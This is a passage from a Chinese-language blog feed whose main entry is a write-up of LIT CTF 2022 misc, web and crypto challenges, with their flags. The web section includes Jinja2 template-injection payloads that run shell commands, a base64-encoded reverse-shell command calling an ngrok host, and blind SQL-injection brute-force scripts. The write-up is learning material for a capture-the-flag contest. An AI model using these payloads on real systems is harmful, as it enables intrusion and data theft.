   fputs(&quot;123456789&quot;, fp);

   fseek( fp, 7, SEEK_SET );
   fputs(&quot;lnj&quot;, fp);
   fclose(fp);
    return 0;
&#125;</code></pre>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>LIT CTF 2022</title>
    <url>/2022/07/25/Lexington%20Informatics%20Tournament%20CTF%202022/</url>
    <content><![CDATA[<p><img src="http://img.hzy2003628.top/202207232145029.png" alt="image-20220723214503970"></p>
<p>Lexington Informatics Tournament CTF 2022</p>
<span id="more"></span>
<hr>
<h1 id="前言">前言</h1>
<p>这个比赛对于外国只是初高中生的CTF比赛，但是就这样的比赛，依然对我来说我只能说还是很难，misc的话前面七八个还好，后面就变得真misc了，web的话还是太菜，见得太少，就只能做上来前几个，crypto，pwn，re没咋接触过，就不说了，只是感觉国外的中学生CTF都这么高质量，真的是该加快进度学习了。最终在队友的带飞下，第七○|￣|_</p>
<p><img src="http://img.hzy2003628.top/202207251421464.png" alt="image-20220725142152394"></p>
<h1 id="misc">misc</h1>
<h2 id="helloworld"><strong>HelloWorld</strong></h2>
<blockquote>
<p>Here’s an easy CTF problem for demonstration purposes. I will go get some caesar salad while you solve this.</p>
</blockquote>
<p>YVGPGS{J3yp0z3_G0_Y1GPGS}</p>
<h2 id="hex-to-ascii"><strong>Hex to ASCII</strong></h2>
<blockquote>
<p>Do you know how to speak hexadecimal? I love speaking in hexadecimal. In fact, in HexadecimalLand, we like to say<br>
4c49544354467b74306f6c355f346e645f77336273317433735f6172335f763372795f696d70307274346e745f6630725f4354467d</p>
</blockquote>
<p>hex转str</p>
<p>LITCTF{t0ol5_4nd_w3bs1t3s_ar3_v3ry_imp0rt4nt_f0r_CTF}</p>
<h2 id="discord-flag"><strong>Discord Flag</strong></h2>
<p>LITCTF{L1T_1S_G0NNA_BE_S0_LIT_W1TH_Y0U_GUYS!}</p>
<h2 id="peanutbutterjar"><strong>PeanutButter.jar</strong></h2>
<blockquote>
<p>We would like to say a huge thank you to Rythm and Eyangch for their massive support. Not only did they write many of the high quality problems, but they also helped us greatly in the process of hosting CTF. They are from the team <strong>PeanutButter.jar</strong> and are actually hosting their own CTF competition in August. If you haven’t already, you should definitely check out their CTFTimes Profile, <a href="https://ctftime.org/team/78193">https://ctftime.org/team/78193</a>.</p>
</blockquote>
<p>LITCTF{H4s_Th3ir_0wn_CTF_OTZ_OTZ_OTZ}</p>
<h2 id="intro-to-litctf"><strong>Intro To LITCTF</strong></h2>
<blockquote>
<p>Welcome to your first CTF Challenge! For this problem, you need to first read the <a href="https://lit.lhsmathcs.org/ctfres">CTF Resource page</a> and find the first half of the flag :D. The second half of the flag can be found at our <a href="https://www.youtube.com/watch?v=5QCkheqOp3s&amp;ab_channel=LexMACS">Opening Ceremony</a>!</p>
</blockquote>
<p>前半段是LITCTF{1_h0p3_y0u_didnt_s</p>
<p>后半段在视频中，是k1p_0ur_op3n1ng_c3r3mony}</p>
<p>所以flag是LITCTF{1_h0p3_y0u_didnt_sk1p_0ur_op3n1ng_c3r3mony}</p>
<h2 id="codetiger-orz-is-meta"><strong>CodeTiger orz Is Meta</strong></h2>
<blockquote>
<p>can you find the flag from this amazing codetiger fan picture!!</p>
</blockquote>
<p>附件是个图片，打开找到flag</p>
<p><img src="http://img.hzy2003628.top/202207230050798.png" alt="image-20220723005052139"></p>
<p>LITCTF{c0de_t1g2r_orz}</p>
<h2 id="kirby"><strong>kirby!!!</strong></h2>
<blockquote>
<p>Kirby is so cool! (Wrap your flag in LITCTF{})</p>
<p>The beginning is very loud so you should turn down your volume.</p>
<p><a href="https://vocaroo.com/12wR27kejDYj">https://vocaroo.com/12wR27kejDYj</a></p>
<p>原曲：Kirby Mass Attack 的 Green Grounds</p>
</blockquote>
<p>使用Adobe Audition进行音频分析得到flag</p>
<p>LITCTF{K1RBY1SCOOL!}</p>
<h2 id="geoguessr-normal-mode"><strong>Geoguessr Normal Mode</strong></h2>
<blockquote>
<p>I like the city! The flag is LITCTF{latitude,longtitude} rounded to the third decimal place. (Example: LITCTF{42.444,-71.230})</p>
</blockquote>
<p><img src="http://img.hzy2003628.top/202207230113950.png" alt="image-20220723011355712"></p>
<p>找地方的取证题，最终坐标如下</p>
<p><img src="http://img.hzy2003628.top/202207230115791.png" alt="image-20220723011512590"></p>
<p>LITCTF{22.189,113.539}</p>
<h1 id="web"><strong>web</strong></h1>
<h2 id="personal-website"><strong>Personal Website</strong></h2>
<blockquote>
<p>I am Esther Man, a brilliant student at Lexington High School. Welcome to my <a href="http://litctf.live:31777/">personal website</a> &lt;3 &lt;3 &lt;3</p>
</blockquote>
<p><img src="http://img.hzy2003628.top/202207230121860.png" alt="image-20220723012157639"></p>
<p>看源码，得到三分之一的flag</p>
<p><img src="http://img.hzy2003628.top/202207230122984.png" alt="image-20220723012214911"></p>
<pre><code class="hljs plaintext">LITCTF&#123;E5th3r_M4n</code></pre>
<p>看js文件，得到后三分之一</p>
<p><img src="http://img.hzy2003628.top/202207230122339.png" alt="image-20220723012238286"></p>
<pre><code class="hljs plaintext">3v3ryth1ng_sh3_d03s&#125;</code></pre>
<p>css文件里找到中间的flag</p>
<p><img src="http://img.hzy2003628.top/202207230131994.png" alt="image-20220723013103936"></p>
<p>LITCTF{E5th3r_M4n_i5_s0_OTZ_0TZ_OFZ_4t_3v3ryth1ng_sh3_d03s}</p>
<h2 id="kevins-cookies"><strong>Kevin’s Cookies</strong></h2>
<blockquote>
<p>Welcome to Kevin Zhu’s <a href="http://litctf.live:31778/">cookie store</a>! I heard he sells many super delicious cookies :yum:</p>
</blockquote>
<p><img src="http://img.hzy2003628.top/202207230136897.png" alt="image-20220723013632734"></p>
<p>cookie有个属性，改成true</p>
<p><img src="http://img.hzy2003628.top/202207230136699.png" alt="image-20220723013657627"></p>
<p><img src="http://img.hzy2003628.top/202207230137021.png" alt="image-20220723013744855"></p>
<p>继续改cookie值，从1一个一个改，到17出flag</p>
<p><img src="http://img.hzy2003628.top/202207230140023.png" alt="image-20220723014006851">LITCTF{Bd1mens10n_15_l1k3_sup3r_dup3r_0rzzzz}</p>
<h2 id="guess-the-pokemon"><strong>Guess The Pokemon</strong></h2>
<blockquote>
<p>Have you heard the new trending game? <a href="http://litctf.live:31772/">GUESS THE POKEMON</a>!!! Please come try out our vast database of pokemons.</p>
</blockquote>
<pre><code class="hljs plaintext">import sqlite3    //sqlite3中的单行注释绕过空格  --%0a
from flask import Flask, render_template, render_template_string, redirect, url_for, request

con = sqlite3.connect(&#x27;data.db&#x27;, check_same_thread=False)
app = Flask(__name__)

cur = con.cursor()
# comment
cur.execute(&#x27;&#x27;&#x27;DROP TABLE IF EXISTS pokemon&#x27;&#x27;&#x27;)
cur.execute(&#x27;&#x27;&#x27;CREATE TABLE pokemon (names text)&#x27;&#x27;&#x27;)
cur.execute(
    &#x27;&#x27;&#x27;INSERT INTO pokemon (names) VALUES (&quot;[FLAG REDACTED]&quot;) &#x27;&#x27;&#x27;
)

@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])
def login():
    if request.method == &#x27;POST&#x27;:

        name = request.form[&#x27;name&#x27;]

        if (&quot;&#x27;&quot; in name or &quot;\\&quot; in name or &#x27;&quot;&#x27; in name):    # 过滤规则  &#x27; \\ &quot;&quot;
          return render_template(&#x27;login.html&#x27;, error=&quot;no quotes or backslashes:)&quot;)   # admin&#x27; and 1=1 #
        elif (name == &quot;names&quot;):
          return render_template(&#x27;login.html&#x27;, error=&quot;you are wrong :&lt;&quot;)     # names
         
        try:
          cur.execute(&quot;SELECT * FROM pokemon WHERE names=&quot; + name + &quot;&quot;)
        except:
          render_template(&#x27;login.html&#x27;, error=&quot;you are wrong :3&quot;)
            
      
            
        rows = cur.fetchall()

        
        if len(rows) &gt; 0:
            return render_template(&#x27;login.html&#x27;,
                                   error=&quot;Correct! The poekmon was &quot; +
                                   rows[0][0])
        else:
            return render_template(&#x27;login.html&#x27;, error=&quot;you are wrong :&lt;&quot;)

    return render_template(&#x27;login.html&#x27;, error=&quot;&quot;)</code></pre>
<p><img src="http://img.hzy2003628.top/202207231634409.png" alt="image-20220723163457315"></p>
<p>发现有好多可以进入到login.html的途径，但是只有当name的值为names时存在漏洞，直接这样会返回you are wrong :&lt;，绕过方法names–%0a</p>
<blockquote>
<p>%0a会被当作回车</p>
</blockquote>
<p><img src="http://img.hzy2003628.top/202207231637012.png" alt="image-20220723163718946"></p>
<p>LITCTF{flagr3l4t3dt0pok3m0n0rsom3th1ng1dk}</p>
<h2 id="among-us"><strong>Among Us</strong></h2>
<blockquote>
<p>Hello! I am Polopopy, and my friends like to call me Ryan. I have an unhealthy fetichobsession with Among Us, so I made <a href="http://litctf.live:31779/">this website</a> to demonstrate my unyielding enthusiasm!</p>
</blockquote>
<p><img src="http://img.hzy2003628.top/202207231456999.png" alt="image-20220723145615775"></p>
<p>花里胡哨的，，抓包看报文头，响应包，得到flag</p>
<p><img src="http://img.hzy2003628.top/202207231457081.png" alt="image-20220723145727977"></p>
<p>LITCTF{mr_r4y_h4n_m4y_b3_su55y_bu7_4t_l3ast_h3s_OTZOTZOTZ}</p>
<blockquote>
<p>ps：刚开始抓包没看到，又是不认真，麻了麻了</p>
</blockquote>
<h2 id="ctf"><strong>CTF</strong></h2>
<blockquote>
<p>Woah, <a href="http://litctf.live:31780/">a Capture The Flag challenge</a>, where players capture each other’s flags, in a tournament called Capture The Flag? This is so original :O I do need a break from the standard web anyway I guess.</p>
</blockquote>
<p>admin1  admin1</p>
<p>然后就出了，我这是站在巨人的肩膀上做的这题</p>
<p><img src="http://img.hzy2003628.top/202207242156956.png" alt="image-20220724215654837"></p>
<p>其实代码里面写着呢</p>
<p><img src="http://img.hzy2003628.top/202207242206787.png" alt="image-20220724220621726"></p>
<p>LITCTF{CTF_1n_a_CTF?_W0AH_TH1S_I5_l1k3_s0_cr34t1v3}</p>
<h2 id="flushed-emoji"><strong>Flushed Emoji</strong></h2>
<blockquote>
<p>Flushed emojis are so cool! Learn more about them <a href="http://litctf.live:31781/">here</a>!</p>
</blockquote>
<p><img src="http://img.hzy2003628.top/202207242257559.png" alt="image-20220724225703442"></p>
<p><a href="http://xn--main-pg9fy45i.py">分析main.py</a>，该网站在Flask上运行，模板引擎 Jinja2</p>
<p><img src="http://img.hzy2003628.top/202207242300235.png" alt="image-20220724230048115"></p>
<p>password为可控变量，经测试也发现是存在ssti漏洞的</p>
<p><img src="http://img.hzy2003628.top/202207242301557.png" alt="image-20220724230150479"></p>
<p>看源码不难发现有过滤规则，把点过滤了</p>
<p><img src="http://img.hzy2003628.top/202207242302451.png" alt="image-20220724230228346"></p>
<pre><code class="hljs plaintext">curl -X POST &#x27;http://litctf.live:31781/&#x27; -d &quot;username=fuck&amp;password=&#123;&#123;request[\&quot;__class__\&quot;][\&quot;__mro__\&quot;][-1][\&quot;__subclasses__\&quot;]()[250](&#x27;ls&#x27;,shell=True,stdout=-1)[&#x27;communicate&#x27;]()[0]&#125;&#125;&quot;</code></pre>
<p><img src="http://img.hzy2003628.top/202207251433426.png" alt="image-20220725143312350"></p>
<p>但是这样并不能找到flag</p>
<pre><code class="hljs plaintext">username=admin&amp;password=&#123;&#123;request[&#x27;application&#x27;][&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;)[&#x27;popen&#x27;](&#x27;ls&#x27;)[&#x27;read&#x27;]()&#125;&#125;</code></pre>
<p><img src="http://img.hzy2003628.top/202207252115464.png" alt="image-20220725211552376"></p>
<p>因为过滤了点，所以采用HTML十六进制编码进行过滤</p>
<pre><code class="hljs plaintext">&#123;&#123;request[&#x27;application&#x27;][&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;)[&#x27;popen&#x27;](&#x27;cat main\x2Epy&#x27;)[&#x27;read&#x27;]()&#125;&#125;</code></pre>
<p><img src="http://img.hzy2003628.top/202207252117982.png" alt="image-20220725211727883"></p>
<pre><code class="hljs plaintext">import requests;
import re;

app = Flask(__name__)


def alphanumericalOnly(str):
  return re.sub(r&amp;#39;[^a-zA-Z0-9]&amp;#39;, &amp;#39;&amp;#39;, str);

@app.route(&amp;#39;/&amp;#39;, methods=[&amp;#39;GET&amp;#39;, &amp;#39;POST&amp;#39;])
def login():
  if request.method == &amp;#39;POST&amp;#39;:

    username = request.form[&amp;#39;username&amp;#39;]
    password = request.form[&amp;#39;password&amp;#39;]

  
    if(&amp;#39;.&amp;#39; in password):
      return render_template_string(&amp;#34;lmao no way you have . in your password LOL&amp;#34;);

    r = requests.post(&amp;#39;http://172.24.0.8:8080/runquery&amp;#39;, json=&#123;&amp;#34;username&amp;#34;: alphanumericalOnly(username),&amp;#34;password&amp;#34;: alphanumericalOnly(password)&#125;); 
    print(r.text);
    if(r.text == &amp;#34;True&amp;#34;):
      return render_template_string(&amp;#34;OMG you are like so good at guessing our flag I am lowkey jealoussss.&amp;#34;);
    return render_template_string(&amp;#34;ok thank you for your info i have now sold your password (&amp;#34; + password + &amp;#34;) for 2 donuts :)&amp;#34;);

  return render_template(&amp;#34;index.html&amp;#34;);


@app.before_request</code></pre>
<p>得到了他的真实ip：172.24.0.8:8080，可以通过RCE漏洞通过WEB应用程序重定向所有查询</p>
<p>先将盲sqli有效负载发送到数据库API，这里需要注意绕过过滤的符号----HTML编码<code>http://172.24.0.8:8080/runquery</code></p>
<pre><code class="hljs plaintext">&#123;&#123;request[&#x27;application&#x27;][&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;)[&#x27;popen&#x27;](&#x27;python3 -c \x27import requests; r = requests\x2Epost(\x22http://172\x2E24\x2E0\x2E8:8080/runquery\x22, json=&#123;\x22username\x22:\x22flag\x22,\x22password\x22:\x22a\\x27 or (SELECT hex(substr(password,1,1)) FROM users limit 1 offset 0) = hex(\\x27a\\x27)--\x22&#125;); print(r\x2Etext)\x27&#x27;)[&#x27;read&#x27;]()&#125;&#125;</code></pre>
<p><img src="http://img.hzy2003628.top/202207252123037.png" alt="image-20220725212309947"></p>
<p>返回false，显然不行</p>
<p>我们知道flag是LITCTF{xxxxxx}，所以我们可以把a替换成L</p>
<pre><code class="hljs plaintext">&#123;&#123;request[&#x27;application&#x27;][&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;)[&#x27;popen&#x27;](&#x27;python3 -c \x27import requests; r = requests\x2Epost(\x22http://172\x2E24\x2E0\x2E8:8080/runquery\x22, json=&#123;\x22username\x22:\x22flag\x22,\x22password\x22:\x22a\\x27 or (SELECT hex(substr(password,1,1)) FROM users limit 1 offset 0) = hex(\\x27L\\x27)--\x22&#125;); print(r\x2Etext)\x27&#x27;)[&#x27;read&#x27;]()&#125;&#125;</code></pre>
<p><img src="http://img.hzy2003628.top/202207252126129.png" alt="image-20220725212632029"></p>
<p>返回true，然后就是迭代暴力破解flag</p>
<pre><code class="hljs plaintext">import requests
import sys
import string

url = &#x27;http://litctf.live:31781/&#x27;

s = requests.Session()

flag = &quot;LITCTF&#123;&quot;

i = 8 

while True: 
  for char in string.printable:
    charhex = r&#x27;\x&#x27; + format(ord(char), &quot;x&quot;)
    
    r = s.post( url, data=&#123;&quot;username&quot;: &quot;a&quot;, &quot;password&quot;: r&quot;&#123;&#123;request[&#x27;application&#x27;][&#x27;__globals__&#x27;][&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;)[&#x27;popen&#x27;](&#x27;python3 -c \x27import requests; r = requests\x2Epost(\x22http://172\x2E24\x2E0\x2E8:8080/runquery\x22, json=&#123;\x22username\x22:\x22flag\x22,\x22password\x22:\x22a\\x27 or (SELECT hex(substr(password,&quot; + str(i) + r&quot;,1)) FROM users limit 1 offset 0) = hex(\\x27&quot; + charhex + r&quot;\\x27)--\x22&#125;); print(r\x2Etext)\x27&#x27;)[&#x27;read&#x27;]()&#125;&#125;&quot;&#125; )
    
    if &quot;False&quot; in r.text:
      continue
    elif &quot;True&quot; in r.text:
      flag += char
      print(flag)
      i += 1 
      
      if char == &#x27;&#125;&#x27;: 
        sys.exit(1) 
        
      break
    else:
      print(r.text)</code></pre>
<p><img src="http://img.hzy2003628.top/202207252141155.png" alt="image-20220725214126065"></p>
<p>LITCTF{flush3d_3m0ji_o.0}</p>
<p>比赛结束后我又看了其他人的wp，有不同的解法也学习一下</p>
<p>和我不一样的是对于点的过滤他是使用方括号进行绕过，并通过<code>_mro_</code>魔法函数来进行RCE</p>
<blockquote>
<p>__mro__返回一个包含类或对象所继承的基类元组。方法在解析式按照元组的顺序解析，从自身所属类到&lt;class’object’&gt;</p>
</blockquote>
<p>最终的有效负载来从服务器获取RCE的paylaod</p>
<pre><code class="hljs plaintext">&#123;&#123;request[”__class__”][”__mro__”][-1][”__subclasses__”]()[250](‘&lt;command&gt;’,shell=True,stdout=-1)[‘communicate’]()[0]&#125;&#125;</code></pre>
<p>但是只是这样可以发现遇到了同样的问题，那就是点没办法绕过，这个还是一样，但是他的绕过方式不一样，他是使用base64进行绕过</p>
<pre><code class="hljs plaintext">curl -X POST &#x27;http://litctf.live:31781/&#x27; -d &quot;username=fuck&amp;password=&#123;&#123;request[\&quot;__class__\&quot;][\&quot;__mro__\&quot;][-1][\&quot;__subclasses__\&quot;]()[250](&#x27;ls&#x27;,shell=True,stdout=-1)[&#x27;communicate&#x27;]()[0]&#125;&#125;&quot; 

curl -X POST &#x27;http://litctf.live:31781/&#x27; -d &quot;username=mrc4t&amp;password=&#123;&#123;request[\&quot;__class__\&quot;][\&quot;__mro__\&quot;][-1][\&quot;__subclasses__\&quot;]()[250](&#x27;echo%20YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY%2BL2Rldi90Y3AvNC50Y3Aubmdyb2suaW8vMTk0NzYgPCYxJwo%3D%20%7C%20base64%20-d%20%7C%20bash&#x27;,shell=True,stdout=-1)[&#x27;communicate&#x27;]()[0]&#125;&#125;&quot;
//echo YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvNC50Y3Aubmdyb2suaW8vMTk0NzYgPCYxJwo= | base64 -d | bash
//echo bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/4.tcp.ngrok.io/19476 &lt;&amp;1&#x27;  | base64 -d | bash</code></pre>
<p><img src="http://img.hzy2003628.top/202207262352548.png" alt="image-20220726235247890"></p>
<p>的确收到了shell，但是他是只读权限，并且连接不持久，总是中断</p>
<p>主要到了数据服务器IP地址是172.24.0.8:8080,这里有sql语句，password是可控变量，他是基于布尔值的sql注入</p>
<p><img src="http://img.hzy2003628.top/202207270003108.png" alt="image-20220727000339023"></p>
<p>所以总体思路就是从服务器源获得本地ip地址</p>
<p>一个基于时间的简单的脚本</p>
<pre><code class="hljs plaintext">import requests
import string
def blindSqli(my_query,url):
    extracted_data = &quot;LITCTF&#123;&quot;
    for index in range(len(extracted_data)+1,10000):
        for i in &quot;_&quot;+string.printable[:-5]:
            query = f&quot;&#x27; or substr((&#123;my_query&#125;),&#123;index&#125;,1)=\&quot;&#123;i&#125;\&quot; -- -&quot; # payload for Sqlite boolean based
            print(f&quot;[+] Trying &#123;i&#125;&quot;)
            try:
                r = requests.post(url, json=&#123;&quot;username&quot;:&quot;flag&quot;, &quot;password&quot;:query&#125;)
                if &quot;True&quot; in r.text:
                    extracted_data+=i
                    if extracted_data[-1] == &quot;&#125;&quot;:
                        return extracted_data
                   
                    print(f&quot;[!] Found &#123;i&#125;&quot;)
                    print(f&quot;[+] &#123;extracted_data&#125;&quot;)
                    break
            except KeyboardInterrupt:
                quit()
            except:
                continue
def main():
    my_query = &quot;select password from users where username=&#x27;flag&#x27;&quot;
    url = &quot;http://172.24.0.8:8080/runquery&quot;
    result = blindSqli(my_query,url)
    print(f&#x27;[+] Here is your flag: &#123;result&#125;&#x27;)
if __name__ == &quot;__main__&quot;:
    main()</code></pre>
<p>进行加密传进去(想法是通过python3运行)</p>
<pre><code class="hljs plaintext">curl -X POST &#x27;http://litctf.live:31781/&#x27; -d &quot;username=mrc4t&amp;password=&#123;&#123;request[\&quot;__class__\&quot;][\&quot;__mro__\&quot;][-1][\&quot;__subclasses__\&quot;]()[250](&#x27;echo aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBzdHJpbmcKCmRlZiBibGluZFNxbGkobXlfcXVlcnksdXJsKToKICAgIGV4dHJhY3RlZF9kYXRhID0gIkxJVENURnsiCiAgICBmb3IgaW5kZXggaW4gcmFuZ2UobGVuKGV4dHJhY3RlZF9kYXRhKSsxLDEwMDAwKToKICAgICAgICBmb3IgaSBpbiAiXyIrc3RyaW5nLnByaW50YWJsZVs6LTVdOgogICAgICAgICAgICBxdWVyeSA9IGYiJyBvciBzdWJzdHIoKHtteV9xdWVyeX0pLHtpbmRleH0sMSk9XCJ7aX1cIiAtLSAtIiAjIHBheWxvYWQgZm9yIFNxbGl0ZSBib29sZWFuIGJhc2VkCiAgICAgICAgICAgIHByaW50KGYiWytdIFRyeWluZyB7aX0iKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGpzb249eyJ1c2VybmFtZSI6ImZsYWciLCAicGFzc3dvcmQiOnF1ZXJ5fSkKICAgICAgICAgICAgICAgIGlmICJUcnVlIiBpbiByLnRleHQ6CiAgICAgICAgICAgICAgICAgICAgZXh0cmFjdGVkX2RhdGErPWkKICAgICAgICAgICAgICAgICAgICBpZiBleHRyYWN0ZWRfZGF0YVstMV0gPT0gIn0iOgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZXh0cmFjdGVkX2RhdGEKICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIHByaW50KGYiWyFdIEZvdW5kIHtpfSIpCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoZiJbK10ge2V4dHJhY3RlZF9kYXRhfSIpCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgIGVsaWYgIkZhbHNlIiBpbiByLnRleHQ6CiAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgogICAgICAgICAgICAgICAgcXVpdCgpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIGNvbnRpbnVlCgpkZWYgbWFpbigpOgogICAgbXlfcXVlcnkgPSAic2VsZWN0IHBhc3N3b3JkIGZyb20gdXNlcnMgd2hlcmUgdXNlcm5hbWU9J2ZsYWcnIgogICAgdXJsID0gImh0dHA6Ly8xNzIuMjQuMC44OjgwODAvcnVucXVlcnkiCiAgICByZXN1bHQgPSBibGluZFNxbGkobXlfcXVlcnksdXJsKQogICAgcHJpbnQoZidbK10gSGVyZSBpcyB5b3VyIGZsYWc6IHtyZXN1bHR9JykKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBtYWluKCkKCg== | base64 -d | python3&#x27;,shell=True,stdout=-1)[&#x27;communicate&#x27;]()[0]&#125;&#125;&quot;</code></pre>
<p>成功复现，这个我着实惊讶，直接把脚本base加密之后这样传进去，然后执行</p>
<p><img src="http://img.hzy2003628.top/202207262358265.png" alt="image-20220726235853162"></p>
<h2 id="amy-the-hedgehog"><strong>Amy The Hedgehog</strong></h2>
<blockquote>
<p>Hi guys! I just learned sqlite3 build my own websiteeee. Come visit my <a href="http://litctf.live:31770/">my website</a> pleaseeee i am ami the dhedghog!!! :3 ( ◡‿◡ *)</p>
</blockquote>
<p><img src="http://img.hzy2003628.top/202207251012021.png" alt="image-20220725101201053"></p>
<p>sql注入漏洞（Flask）</p>
<pre><code class="hljs plaintext">1&#x27; or 1=1 -- -</code></pre>
<p><img src="http://img.hzy2003628.top/202207251014651.png" alt="image-20220725101447558"></p>
<p>LITCTF{sldjf}</p>
<h2 id="eyangch-fan-art-maker"><strong>EYANGCH Fan Art Maker</strong></h2>
<blockquote>
<p>I am biggest fan of Eyang OTZ OTZ OTZ, which is why I built this <a href="http://litctf.live:31775/">EYANGCH Fan Art Maker</a></p>
</blockquote>
<p><img src="http://img.hzy2003628.top/202207251020466.png" alt="image-20220725102039254"></p>
<p><img src="http://img.hzy2003628.top/202207251021307.png" alt="image-20220725102101162"></p>
<p>submit后会出现一张图片，被遮盖了的flag</p>
<p><img src="http://img.hzy2003628.top/202207251021763.png" alt="image-20220725102142608"></p>
<p>这题没怎么接触过这种标签，没解出来，这是别人的非预期解</p>
<pre><code class="hljs plaintext">&lt;component name=&quot;EYANGOTZ&quot;&gt;&lt;/component&gt;</code></pre>
<p><img src="http://img.hzy2003628.top/202207251215872.png" alt="image-20220725121503736"></p>
<p>LITCTF{wh4t_d03s_CH_1n_eyangCH_m3an???}</p>
<p>预期解是这样的</p>
<p><img src="http://img.hzy2003628.top/202207252222604.png" alt="image-20220725222206533"></p>
<p>在这里可以看到flag在绘制，只是最后被后面的其他绘制遮挡了</p>
<p><img src="http://img.hzy2003628.top/202207252223567.png" alt="image-20220725222303487"></p>
<pre><code class="hljs plaintext">&lt;flag x=&quot;100&quot; y=&quot;400&quot;&gt;&lt;/flag&gt;</code></pre>
<p>所以我们可以模仿他的这个标签再写一个</p>
<pre><code class="hljs plaintext">&lt;flag x=&quot;1&quot; y=&quot;4&quot;&gt;&lt;/flag&gt;</code></pre>
<p><img src="http://img.hzy2003628.top/202207252225813.png" alt="image-20220725222551716"></p>
<p>发现没发现没，反正我发现了，只是坐标不对，再调一下</p>
<pre><code class="hljs plaintext">&lt;flag x=&quot;10&quot; y=&quot;40&quot;&gt;&lt;/flag&gt;</code></pre>
<p><img src="http://img.hzy2003628.top/202207252226801.png" alt="image-20220725222635724"></p>
<h2 id="eyangch-fan-art-maker-20"><strong>EYANGCH Fan Art Maker 2.0</strong></h2>
<blockquote>
<p>Unfortunately the last Fan Art maker had an unintended extremely easy solution. Frankly I am disappointed by people’s willingness to take the easy route when it comes to ORZing Eyang. To make up for it, here is more <a href="http://litctf.live:45392/">EYANG OTZ OTZ OTZ</a></p>
</blockquote>
<p><img src="http://img.hzy2003628.top/202207270010601.png" alt="image-20220727001037412"></p>
<p>界面还是一样，只是代码不一样了</p>
<p>测试example</p>
<pre><code class="hljs plaintext">&lt;component name=&quot;ILoveEyangCH&quot;&gt;
    &lt;component name=&quot;Heart&quot; x=&quot;10&quot; y=&quot;10&quot;&gt;
        &lt;shape color=&quot;red&quot;&gt;
            &lt;point x=&quot;0&quot; y=&quot;30&quot;&gt;&lt;/point&gt;
            &lt;point x=&quot;30&quot; y=&quot;0&quot;&gt;&lt;/point&gt;
            &lt;point x=&quot;60&quot; y=&quot;30&quot;&gt;&lt;/point&gt;
            &lt;point x=&quot;90&quot; y=&quot;0&quot;&gt;&lt;/point&gt;
            &lt;point x=&quot;120&quot; y=&quot;30&quot;&gt;&lt;/point&gt;
            &lt;point x=&quot;60&quot; y=&quot;90&quot;&gt;&lt;/point&gt;
        &lt;/shape&gt;
    &lt;/component&gt;
    &lt;text x=&quot;0&quot; y=&quot;300&quot; font=&quot;bold 30pt Arial&quot;&gt;EYANG OTZ OTZ OTZ!!!&lt;/text&gt;    
&lt;/component&gt;
&lt;ILoveEyangCH x=&quot;50&quot; y=&quot;50&quot;&gt;&lt;/ILoveEyangCH&gt;
&lt;ILoveEyangCH x=&quot;130&quot; y=&quot;100&quot;&gt;&lt;/ILoveEyangCH&gt;
&lt;ILoveEyangCH x=&quot;210&quot; y=&quot;150&quot;&gt;&lt;/ILoveEyangCH&gt;</code></pre>
<p><img src="http://img.hzy2003628.top/202207270013895.png" alt="image-20220727001316784"></p>
<p>初步分析之后可以发现这个payload</p>
<pre><code class="hljs plaintext">&lt;component name=&quot;EYANGOTZ&quot;&gt;
    &lt;component name=&quot;eyes1&quot;&gt;
    
    &lt;/component&gt;
    &lt;component name=&quot;eyes2&quot;&gt;
        
    &lt;/component&gt;
    &lt;component name=&quot;mouth&quot;&gt;
    
    &lt;/component&gt;
&lt;/component&gt;
//  component标签下最开始是EYANGOTZ，也就是所谓的flag地方，但是里面嵌套了一些蓝色条条，也就是看到的那些遮挡物
</code></pre>
<p>所以尝试直接删除嵌套，看看会不会出来</p>
<pre><code class="hljs plaintext">&lt;component name=&quot;EYANGOTZ&quot;&gt; &lt;/component&gt;</code></pre>
<p><img src="http://img.hzy2003628.top/202207270014209.png" alt="image-20220727001422095"></p>
<p>LTLCTF{3y4ngCH_15_l1k3_iu5t_s0_g3n10sit4}</p>
<h1 id="crypto"><strong>crypto</strong></h1>
<h2 id="running-up-that-hill">Running Up That Hill</h2>
<blockquote>
<p>If I only could, I’d make a deal with god, and I’d get him to swap our places.</p>
</blockquote>
<pre><code class="hljs plaintext">ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#123;&#125;

5 19 27
10 19 24
11 6 16

A8FC7A&#123;H7_ZODCEND_8F_CCQV_RTTVHD&#125;</code></pre>
<p>hill解密，只是需要自定义字母表，国内解密网站我都找烂了，硬是没找到，贴个国外的解密网站吧</p>
<p><a href="https://www.dcode.fr/chiffre-hill">https://www.dcode.fr/chiffre-hill</a></p>
<p><img src="http://img.hzy2003628.top/202207231449882.png" alt="image-20220723144923801"></p>
<p>LITCTF{B3_RUNN1NG_UP_TH4T_H1LLLL}</p>
<h2 id="flashy-colors"><strong>Flashy Colors</strong></h2>
<blockquote>
<p>Computer pixels are so interesting. Do you know that they are actually made of three lights? It’s like each pixel has 3 tiny light switches, red, green, and blue, that can go on or off to create so many different colors.</p>
</blockquote>
